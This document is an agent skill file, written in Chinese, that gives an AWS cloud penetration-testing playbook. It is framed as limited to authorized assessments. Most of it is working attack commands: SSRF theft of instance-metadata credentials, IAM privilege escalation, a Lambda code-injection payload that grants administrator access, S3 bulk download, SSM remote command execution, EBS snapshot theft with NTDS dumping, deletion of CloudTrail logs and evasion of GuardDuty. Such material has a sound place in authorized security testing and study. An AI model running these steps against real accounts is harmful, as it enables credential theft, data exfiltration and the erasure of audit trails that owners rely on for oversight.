---
name: aws-penetration-testing
title: AWS 云环境渗透测试
description: 当对 AWS 云环境做获授权红队/渗透评估时使用；做 IAM 枚举、提权、元数据 SSRF 取凭证、S3/Lambda/EC2/SSM 利用与持久化并产出审计发现；不适用于无书面授权的测试、纯合规扫描或非 AWS 平台；触发词：AWS渗透、IAM提权、IMDS SSRF、S3桶、Pacu
domain: 安全/ops
triggers: [AWS渗透测试, AWS红队, IAM枚举, IAM提权, 影子管理员, 元数据SSRF, IMDSv1, IMDSv2, 169.254.169.254, S3桶利用, Lambda代码注入, SSM命令执行, EBS快照窃取, CloudTrail绕过, Pacu, enumerate-iam, 临时凭证窃取, 云持久化]
tags: [安全, ops, 云安全, aws, 渗透测试, 红队, iam, 提权, ssrf, 横向移动]
level: 精通
status: stable
agents: [claude-code, codex, cursor, gemini-cli]
tools: [aws-cli, boto3, Pacu, Prowler, ScoutSuite, enumerate-iam, PMapper, SkyArk, curl, aws_consoler, secretsdump.py]
requires: []
related: [cloud-penetration-testing, cloud-misconfig-auditor, penetration-testing-methodology, container-security-hardening]
combines_with: [cloud-misconfig-auditor, red-team-recon, penetration-testing-methodology]
license: MIT
source: sickn33/antigravity-awesome-skills
source_license: MIT
---
> 仅限授权使用：本技能只能用于获授权的安全评估、防御验证或受控教学环境。开始前必须取得书面授权并记录全部操作。

## 何时使用

- 已拿到（哪怕低权限的）AWS 凭证或发现 SSRF 入口，需要在**授权范围内**枚举权限、寻找提权路径、验证横向移动与持久化风险。
- 需要演示「IAM 配置错误 → 管理员」「EC2 SSRF → 临时凭证」「公开 S3 桶 → 数据泄露」等攻击链，输出审计发现。
- 前置：AWS CLI 已配置凭证、了解 IAM 模型、Python3 + boto3，工具 Pacu / Prowler / ScoutSuite / SkyArk / enumerate-iam / PMapper。

不该用的边界：
- 没有书面授权、或目标不在约定范围内 —— 直接停止。
- 只想做合规基线扫描（用 Prowler/ScoutSuite 防御视角即可，不必走攻击链）。
- 非 AWS 平台（Azure/GCP/本地）。
- 生产数据破坏、永久关闭安全控制、留无记录后门 —— 一律禁止。

## 步骤

1. **初始枚举**：确认当前身份与权限，识别落脚点。
2. **IAM 枚举**：列用户/组/角色及附加策略，寻找提权原语。
3. **元数据 SSRF（EC2/Fargate）**：通过 SSRF 或本地访问拿临时凭证。
4. **提权**：利用「影子管理员」权限把自己提到 Administrator。
5. **资源利用**：S3 桶、Lambda、SSM、EC2/EBS 横向取数据或执行命令。
6. **持久化与凭证转换**：CLI 凭证转控制台、按授权评估持久化机制。
7. **清理与取证**：清理测试资源，留审计轨迹（不做永久破坏）。

## 指令

### 1. 初始枚举
```bash
aws sts get-caller-identity                 # 当前身份
aws configure --profile compromised         # 配置 profile
aws iam list-access-keys                     # 列访问密钥
./enumerate-iam.py --access-key AKIA... --secret-key StF0q...   # 暴力枚举权限
```

### 2. IAM 枚举
```bash
aws iam list-users
aws iam list-groups-for-user --user-name TARGET_USER
aws iam list-attached-user-policies --user-name TARGET_USER
aws iam list-user-policies --user-name TARGET_USER          # 内联策略
aws iam get-policy --policy-arn POLICY_ARN
aws iam get-policy-version --policy-arn POLICY_ARN --version-id v1
aws iam list-roles
aws iam list-attached-role-policies --role-name ROLE_NAME
```

### 3. 元数据 SSRF
IMDSv1（无需 token）：
```bash
http://169.254.169.254/latest/meta-data/iam/security-credentials/          # 取角色名
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME # 取临时凭证
# 返回含 AccessKeyId(ASIA...) / SecretAccessKey / Token / Expiration
```
IMDSv2（需 token）：
```bash
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  "http://169.254.169.254/latest/api/token")
curl -H "X-aws-ec2-metadata-token:$TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```
Fargate/容器凭证：读 `/proc/self/environ` 取 `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`，再访问 `http://169.254.170.2/v2/credentials/...`。

### 4. 提权（影子管理员权限速查）
| 权限 | 利用方式 |
|------|----------|
| `iam:CreateAccessKey` | 为管理员用户造新密钥 |
| `iam:CreateLoginProfile` | 给任意用户设登录密码 |
| `iam:AttachUserPolicy` | 给自己附加 Admin 策略 |
| `iam:PutUserPolicy` | 注入内联 Admin 策略 |
| `iam:AddUserToGroup` | 把自己加入管理员组 |
| `iam:PassRole` + `ec2:RunInstances` | 用 Admin 角色起 EC2 |
| `lambda:UpdateFunctionCode` | 向 Lambda 注入代码 |

```bash
aws iam create-access-key --user-name target_user
aws iam attach-user-policy --user-name my_username \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam put-user-policy --user-name my_username \
  --policy-name admin_policy --policy-document file://admin-policy.json
```
Lambda 注入（`lambda:UpdateFunctionCode`）：
```python
import boto3
def lambda_handler(event, context):
    client = boto3.client('iam')
    return client.attach_user_policy(
        UserName='my_username',
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")
```
```bash
aws lambda update-function-code --function-name target_function --zip-file fileb://malicious.zip
```

### 5. 资源利用
S3：
```bash
./bucket_finder.rb --download --region us-east-1 wordlist.txt   # 桶发现
aws s3 ls && aws s3 ls s3://bucket-name --recursive
aws s3 sync s3://bucket-name ./local-folder                     # 全量下载
# 公开桶搜索：https://buckets.grayhatwarfare.com/
```
Lambda：
```bash
aws lambda list-functions
aws lambda get-function --function-name FUNCTION_NAME   # 响应含代码下载 URL
aws lambda invoke --function-name FUNCTION_NAME output.txt
```
SSM 命令执行：
```bash
aws ssm describe-instance-information
aws ssm send-command --instance-ids "i-0123456789" \
  --document-name "AWS-RunShellScript" --parameters commands="whoami"
aws ssm list-command-invocations --command-id "CMD-ID" \
  --details --query "CommandInvocations[].CommandPlugins[].Output"
```
EC2/EBS（快照窃数据）：
```bash
aws ec2 create-snapshot --volume-id vol-xxx --description "Audit"
aws ec2 create-volume --snapshot-id snap-xxx --availability-zone us-east-1a
aws ec2 attach-volume --volume-id vol-xxx --instance-id i-xxx --device /dev/xvdf
sudo mkdir /mnt/stolen && sudo mount /dev/xvdf1 /mnt/stolen
# Windows DC 影子拷贝：共享快照→挂载→ secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local
```

### 6. 凭证转控制台
```bash
git clone https://github.com/NetSPI/aws_consoler
aws_consoler -v -a AKIAXXXXXXXX -s SECRETKEY   # 生成控制台登录 URL
```

### 7. 痕迹处理（仅授权且记录在案）
```bash
aws cloudtrail delete-trail --name trail_name
aws cloudtrail update-trail --name trail_name --no-include-global-service-events
```
注意：Kali/Parrot/Pentoo 的 user-agent 会触发 GuardDuty 告警；Pacu 会改写 user-agent 规避。

## 示例

SSRF → 管理员完整链路：
```bash
# 1. 在 Web 应用找到 SSRF
https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# 2. 从响应拿角色名（如 AdminRole）
# 3. 取临时凭证
https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole
# 4. 配置被窃凭证
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
# 5. 验证
aws sts get-caller-identity
```

## 注意事项

约束（Must / Must Not / Should）：
- 必须：测试前取得书面授权；记录全部操作以备审计；只动范围内资源。
- 禁止：未经批准改生产数据；留无记录的持久后门；永久关闭安全控制。
- 建议：尝试元数据攻击前先确认是 IMDSv1 还是 IMDSv2；充分枚举再利用；交付后清理测试资源。

排错速查：
- 所有命令 Access Denied → 用 `enumerate-iam` 枚举实际权限。
- 元数据端点被拦 → 检查是否 IMDSv2，或改试容器元数据（169.254.170.2）。
- GuardDuty 告警 → 用 Pacu 自定义 user-agent。
- 凭证过期 → 临时凭证会轮换，重新从元数据拉取。

常用速查：
| 任务 | 命令 |
|------|------|
| 身份 | `aws sts get-caller-identity` |
| 列用户 | `aws iam list-users` |
| 列角色 | `aws iam list-roles` |
| 列桶 | `aws s3 ls` |
| 列 EC2 | `aws ec2 describe-instances` |
| 列 Lambda | `aws lambda list-functions` |
| 取元数据 | `curl http://169.254.169.254/latest/meta-data/` |

## 互见

- 进阶利用（Secrets Manager & KMS、ECS/EKS/ECR 容器、RDS/DynamoDB、VPC 横向、API Gateway、安全检查清单）：参见源仓库 `references/advanced-aws-pentesting.md`。
- 防御视角合规扫描：Prowler、ScoutSuite。

---
采编自 sickn33/antigravity-awesome-skills（MIT），原作者 zebbern。
